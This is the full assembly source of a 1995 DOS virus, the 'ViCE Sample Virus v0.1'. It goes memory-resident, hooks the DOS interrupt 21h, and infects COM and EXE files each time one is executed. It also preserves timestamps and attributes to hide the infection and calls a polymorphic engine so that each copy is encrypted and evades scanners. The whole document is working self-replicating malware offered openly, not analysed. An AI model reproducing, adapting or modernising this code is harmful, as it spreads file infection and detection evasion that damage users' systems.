﻿


; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-Ä
;  ûiCE Sample Virus v0.1 - (c)1995 ûirogen
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-Ä
;  [Note: This was my Simplex-CE virus I wrote over a year ago. I fixed ]
;  [      the bugs, updated some other shit, and ofcourse install ViCE]
;
; þ Infects COM and EXE when executed.
; þ COM Infection marker: first byte is STI
; þ EXE infection marker: Checksum in header not equal to 0.
; þ Time/Date do not change
; þ Read-only and hidden files will be infected, and attributes restored.
; þ Virus installs its own critical error handler
;
; The text "[ûiCE Sample Virus v0.1á]" is visible within the virus code.
;
;

cseg segment
     assume cs:cseg, ds:cseg, es:cseg, ss:cseg

signal equ 0FA45h
buf_size equ 250
vice_size equ 1572+buf_size
virus_size equ (offset vend-offset start)+VICE_SIZE
extrn _vice:near

org 0h
start:

     call    nx                          ; get relative offset
     nx:     pop bp
     sub     bp,offset nx

     push    ds es
     mov     ax,signal                    ; are we memory resident?
     int     21h
     or      ax,ax
     jz      no_install                   ; if carry then we are

     mov     ax,ds                        ; PSP segment
     dec     ax                           ; mcb below PSP m0n
     mov     ds,ax                        ; DS=MCB seg
     cmp     byte ptr ds: [0],'Z'         ; Is this the last MCB in chain?
     jnz     no_install
     sub     word ptr ds: [3],((virus_size+1023)/1024)*64*2 ; alloc MCB
     sub     word ptr ds: [12h],((virus_size+1023)/1024)*64*2 ; alloc PSP
     mov     es,word ptr ds: [12h]        ; get high mem seg
     push    cs
     pop     ds
     mov     si,bp
     mov     cx,virus_size/2+1
     xor     di,di
     rep     movsw                        ; copy code to new seg
     xor     ax,ax
     mov     ds,ax                        ; null ds
     push    ds
     lds     ax,ds: [21h*4]               ; get 21h vector
     mov     es: word ptr old21+2,ds      ; save S:O
     mov     es: word ptr old21,ax
     pop     ds
     mov     ds: [21h*4+2],es             ; new int 21h seg
     mov     ds: [21h*4],offset new21     ; new offset
     sub     byte ptr ds: [413h],((virus_size+1023)*2)/1024;-totalmem

     no_install:

     pop     es ds                   ; restore ES DS
     cmp     cs:is_exe[bp],1
     jz      exe_return

     lea     si,org_bytes[bp]        ; com return
     mov     di,0100h                ; -restore first 4 bytes
     mov     cx,2
     rep     movsw

     mov     ax,100h                 ; jump back to 100h
     push    ax
_ret:ret

     exe_return:
     mov      cx,ds                  ; calc. real CS
     add      cx,10h
     add      word ptr cs:[exe_jump+2+bp],cx
     int      3                      ; fix prefetch
     db       0eah
exe_jump dd 0
is_exe db 0

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Infection routine - called from INT 21h handler.
;    DS:DX=fname
;

infect_file:

        push    dx
        pop     si

        push    ds
        xor     ax,ax                   ; null ES
        mov     es,ax
        lds     ax,es:[24h*4]           ; get INT 24h vector
        mov     cs:old_24_off,ax           ; save it
        mov     cs:old_24_seg,ds
        mov     es:[24h*4+2],cs         ; install our handler
        mov     es:[24h*4],offset new_24
        pop     ds
        push    es                      ; we'll need it later
        push    cs
        pop     es

        mov     ax,4300h                ; get phile attribute
        int     21h
        mov     ax,4301h                ; null attribs
        push    ax cx                   ; save AX-call/CX-attrib
        xor     cx,cx
        int     21h

        mov     ax,3d02h                ; open the file
        int     21h
        jc      dont_do

        mov     bx,ax                   ; get handle
 
        push    cs
        pop     ds

        mov     ah,3fh                  ; Read first bytes of file
        mov     cx,20h
        lea     dx,org_bytes
        int     21h

        cmp     word ptr org_bytes,'ZM'
        jz      do_exe
        cmp     byte ptr org_bytes,0FBh   ; STI?
        jz      close

        mov     is_exe,0

        mov     ax,5700h                  ; get time/date
        int     21h
        push    cx dx

        call    offset_end
        push    ax                        ; AX=end of file

        lea     si,start                  ; DS:SI=start of code to encrypt
        mov     di,virus_size             ; ES:DI=address for decryptor/
        push    di                        ;       encrypted code. (at heap)
        mov     cx,virus_size             ; CX=virus size
        mov     dx,ax                     ; DX=EOF offset
        add     dx,100h                   ; DX=offset decryptor will run from
        mov     al,00001111b              ; jmps,anti-tbscan, garbage, no CS:
        call    _vice                     ; call engine!

        pop     dx
        mov     ah,40h
        int     21h

        call    offset_zero
        pop     ax                        ; restore COM file size
        sub     ax,4                      ; calculate jmp offset
        mov     word ptr new_jmp+1,ax

        lea     dx,new_code
        mov     cx,4
        mov     ah,40h
        int     21h

        pop     dx cx                     ; pop date/time
        mov     ax,5701h                  ; restore the mother fuckers
        int     21h

 close:

        pop     cx ax                     ; restore attrib
        int     21h

        mov     ah,3eh
        int     21h

 dont_do:
        pop     es                        ; ES=0
        lds     ax,dword ptr old_24_off   ; restore shitty DOS error handler
        mov     es:[24h*4],ax
        mov     es:[24h*4+2],ds

        ret

 do_exe:

        cmp     word ptr exe_header[12h],0        ; is checksum (in hdr) 0?
        jnz     close
        cmp     byte ptr exe_header[18h],52h      ; pklite'd?
        jz      exe_ok
        cmp     byte ptr exe_header[18h],40h      ; don't infect new format exe
        jge     close
exe_ok:
        push    bx

        mov     ah,2ch                           ; grab a random number
        int     21h
        mov     word ptr exe_header[12h],dx      ; mark that it's us
        mov     is_exe,1

        les     ax,dword ptr exe_header+14h ; Save old entry point
        mov     word ptr ds:exe_jump, ax
        mov     word ptr ds:exe_jump+2, es

        push    cs
        pop     es

        call    offset_end

        push    dx ax                       ; save file size DX:AX

        mov     bx, word ptr exe_header+8h  ; calc. new entry point
        mov     cl,4                        ; *16
        shl     bx,cl                       ;  ^by shifting one byte
        sub     ax,bx                       ; get actual file size-header
        sbb     dx,0
        mov     cx,10h                      ; divide AX/CX rDX
        div     cx

        mov     word ptr exe_header+14h,dx
        mov     word ptr exe_header+16h,ax
        mov     rel_off,dx

        pop     ax                         ; AX:DX file size
        pop     dx
        pop     bx

        mov     cx,virus_size+10h  ; calc. new size
        adc     ax,cx

        mov     cl,9                       ; calc new alloc (512)
        push    ax
        shr     ax,cl
        ror     dx,cl
        stc
        adc     dx,ax
        pop     ax                         ; ax=size+virus
        and     ah,1

        mov     word ptr exe_header+4h,dx
        mov     word ptr exe_header+2h,ax

        lea     si,start                   ; DS:SI=start of code to encrypt
        mov     di,virus_size              ; ES:DI=address for decryptor and
        push    di                         ;       encrypted code (at heap)
        mov     cx,virus_size              ; CX=virus size
        mov     dx,rel_off                 ; DX=offset decryptor will run from
        mov     al,00001110b               ; jmps,anti-tbscan,garbage, use CS:
        call    _vice                      ; call engine!

        pop     dx
        mov     ah,40h
        int     21h

        call    offset_zero

        mov     cx,18h                     ; write fiXed header
        lea     dx,exe_header
        mov     ah,40h
        int     21h

        jmp     close

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; set file ptr

offset_zero:                               ; self explanitory
        xor     al,al
        jmp     set_fp
offset_end:
        mov     al,02h
 set_fp:
        mov     ah,42h
        xor     cx,cx
        xor     dx,dx
        int     21h
        ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; new 21h

new21:

      pushf
      cmp ax,signal            ; be it us?
      jnz not_us               ; richtig..
      xor ax,ax
      popf
      iret
      not_us:
      cmp ax,4b00h             ; execute phile?
      jnz jmp_org

      push ax bx cx di dx si ds es
      call infect_file
      pop es ds si dx di cx bx ax

      jmp_org:
      popf
      db 0eah                              ; jump far XXXX:XXXX
      old21 dd 0

new_24:                                    ; critical error handler
       mov al,3                            ; prompts suck, return fail
       iret


credits db '[ûiCE Sample Virus v0.1]'
new_code db 0Fbh                           ; STI      (our marker)
new_jmp db 0E9h,0,0                        ; jmp XXXX
rel_off dw 0
exe_header:
org_bytes db 0CDh,20h,0,0                  ; original COM bytes | exe hdr
heap:
db        16h dup(0)                       ; remaining exe header space
old_24_off dw 0                            ; old int24h vector
old_24_seg dw 0
vend:
cseg ends
     end start


